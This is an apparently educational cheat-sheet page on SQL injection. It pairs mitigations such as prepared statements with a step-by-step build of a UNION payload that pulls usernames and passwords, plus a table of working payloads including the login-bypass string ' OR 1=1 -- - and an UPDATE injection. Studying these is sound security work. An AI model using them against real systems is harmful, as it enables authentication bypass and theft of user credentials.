# SQL injections (SQLi)

<div class="row row-cols-md-2"><div>

Mitigations

* Use **prepared requests** (statements), they are ensuring that the parameters of your queries are not interpreted as SQL code
* **Input validation** or **escaping user input**: You can filter input, but you CAN'T rely on it, as your filter will _most likely_ be bypassed
* **Do not trust anyone** üìå. SQL injections may be delayed. You may do protect your login queries, but if the provided username is some SQL code, then any other request using the username may interpret it, hence you should secure every request, even if there are not handling data from the user, as they may later. You should use an API for better security.
</div><div>

**How we created this payload:**

**Test `'`**: because the value is inside quotes, we need to close it.

```sql
Select name,desc from product where name LIKE '%'%'
```

The problem, is that now the query won't work, because we have a trailing `%'`. So, we comment out the rest of the query with `' --`.

```sql
Select name,desc from product where name LIKE '%' --%'
```

The code above may not work in some DBMS, because they want a space between the start of a comment, and the comment itself. So, we add "` -`", to ensure that there is a space giving us **`'-- -`**.

```sql
Select name,desc from product where name LIKE '%' -- -%'
```

Between `'` and `-- -`, we can write SQL code, through the syntax of the final query must be valid ‚úåÔ∏è. In the example, we used "` UNION Select username,password FROM users`" to merge the results of two queries.
</div></div>

<hr class="sep-both">

## Famous payloads

**Payloads** are the values that you are using to break into the database.

<div class="row row-cols-md-2"><div>

* [sql-injection-payload-list](https://github.com/payloadbox/sql-injection-payload-list) (2.6k ‚≠ê)
* [PayloadsAllTheThings/SQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection) (42.3k ‚≠ê)
</div><div>

* [SQLMap](../sqlmap/index.md) (25k ‚≠ê) - automated tool üìå

</div></div>

<table class="table table-bordered table-striped border-dark mt-3">
<thead>
<tr><th>Name</th><th>SQL</th><th>Payload</th></tr>
</thead>
<tbody>

<tr><td>Usual PoC</td><td><code>Select [...] where xxx='here' [...]</code></td><td><code>'</code><br><small>The query will fail as there would be 3 quotes,<br> and that would confirm that an injection is possible.</small></td></tr>

<tr><td>NoPassword</td><td><code>Select [...] where username='here' AND password='here' [...]</code></td><td><code>' OR 1=1 -- -</code><br><small>The query will bypass the check of the password,<br>if it was made in the query.<br>We use 1=1 for maximum compatibility.</small></td></tr>

<tr><td>Input box String</td><td><code>Select [...] where xxx='here' [...]</code></td><td><code>' code -- -</code></td></tr>

<tr><td>Input box Non-String</td><td><code>Select [...] where xxx=here [...]</code></td><td><code>'' code -- -</code></td></tr>

<tr><td>Update</td><td><code>Update [...] set x='here',y=[...]</code></td><td><code>',x=(code),y='</code></td></tr>
</tbody></table>

<div class="row row-cols-md-2 mt-4"><div>

* If there are client-side filters, then intercept the request (ex: Burp)

* If the developer was lazy, the "names" in the form, may be similar, or the name of columns in the database

</div><div>
</div></div>